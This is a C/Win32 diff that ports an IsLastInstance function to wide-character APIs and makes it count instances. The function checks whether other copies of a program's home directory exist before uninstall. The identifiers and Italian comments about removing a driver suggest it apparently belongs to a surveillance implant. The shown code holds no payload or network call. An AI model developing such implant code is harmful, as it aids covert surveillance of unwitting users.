@@ -315,19 +315,19 @@ DWORD HM_RemoveCoreThread(void *dummy)
 
 BOOL IsLastInstance()
 {
-	char first_part[MAX_PATH];
-	char second_part[MAX_PATH];
-	char search_string[MAX_PATH];
-	char complete_path[MAX_PATH];
-	char *ptr = NULL;
-	WIN32_FIND_DATA FindFileData;
-	HANDLE hFind = INVALID_HANDLE_VALUE;
-	BOOL is_last = TRUE;
+	WCHAR first_part[MAX_PATH];
+	WCHAR second_part[MAX_PATH];
+	WCHAR search_string[MAX_PATH];
+	WCHAR complete_path[MAX_PATH];
+	WCHAR *ptr = NULL;
+	WIN32_FIND_DATAW FindFileData;
+	HANDLE hFind = INVALID_HANDLE_VALUE, hFile;
+	DWORD instances = 0;
 
-	_snprintf_s(first_part, MAX_PATH, _TRUNCATE, "%s", H4_HOME_PATH);
-	if (ptr = StrChr(first_part, '\\')) {
+	_snwprintf_s(first_part, MAX_PATH, _TRUNCATE, L"%S", H4_HOME_PATH);
+	if (ptr = wcschr(first_part, L'\\')) {
 		ptr++;
-		if (ptr = StrChr(ptr, '\\')) {
+		if (ptr = wcschr(ptr, L'\\')) {
 			ptr++;
 			*ptr = 0;
 			ptr++;
@@ -335,13 +335,13 @@ BOOL IsLastInstance()
 	}
 	if (!ptr)
 		return FALSE;
-	_snprintf_s(search_string, MAX_PATH, _TRUNCATE, "%s*", first_part);
-	if (!(ptr = StrChr(ptr, '\\')))
+	_snwprintf_s(search_string, MAX_PATH, _TRUNCATE, L"%s*", first_part);
+	if (!(ptr = wcschr(ptr, L'\\')))
 		return FALSE;
 	ptr++;
-	_snprintf_s(second_part, MAX_PATH, _TRUNCATE, "%s", ptr);
+	_snwprintf_s(second_part, MAX_PATH, _TRUNCATE, L"%s", ptr);
 
-	hFind = FNC(FindFirstFileA)(search_string, &FindFileData);
+	hFind = FNC(FindFirstFileW)(search_string, &FindFileData);
 	if (hFind == INVALID_HANDLE_VALUE) 
 		return FALSE;
 	
@@ -349,17 +349,20 @@ BOOL IsLastInstance()
 		// Verifica se ci sono altre directory oltre alla nostra
 		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
 			continue;
-		_snprintf_s(complete_path, MAX_PATH, _TRUNCATE, "%s%s%s", first_part, FindFileData.cFileName, second_part);
-		if (!stricmp(complete_path, H4_HOME_PATH))
-			continue;
-		if (CreateFileA(complete_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)!=INVALID_HANDLE_VALUE) {
-			is_last = FALSE;
-			break;
+		_snwprintf_s(complete_path, MAX_PATH, _TRUNCATE, L"%s%s\\%s", first_part, FindFileData.cFileName, second_part);
+		
+		if ((hFile = CreateFileW(complete_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0))!=INVALID_HANDLE_VALUE) {
+			instances++;
+			CloseHandle(hFile);
 		}
-	} while (FNC(FindNextFileA)(hFind, &FindFileData) != 0);
+
+	} while (FNC(FindNextFileW)(hFind, &FindFileData) != 0);
 	FNC(FindClose)(hFind);
 
-	return is_last;
+	if (instances>1)
+		return FALSE;
+
+	return TRUE;
 }
 
 // Rimuove il driver dal sistema 
